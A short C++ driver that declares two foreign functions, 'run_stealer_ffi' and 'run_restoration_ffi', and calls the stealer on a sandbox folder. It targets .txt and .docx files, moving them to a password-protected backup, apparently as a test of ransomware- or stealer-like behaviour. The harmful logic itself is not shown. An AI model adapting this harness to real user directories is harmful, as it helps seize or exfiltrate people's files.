extern "C" {
	bool run_stealer_ffi (
		const char* target_path,
		const char* backup_folder,
		const char* suffix,
		const char* password
	);
	bool run_restoration_ffi (
		const char* backup_folder,
		const char* password
	);
};

int main() {
	const char* multi_suffixes = ".txt|.docx";
	
	bool success = run_stealer_ffi(
	    "/tmp/sandbox/storage", 
	    "/tmp/sandbox/backup", 
	    multi_suffixes, 
	    "my_secure_password"
	);
}
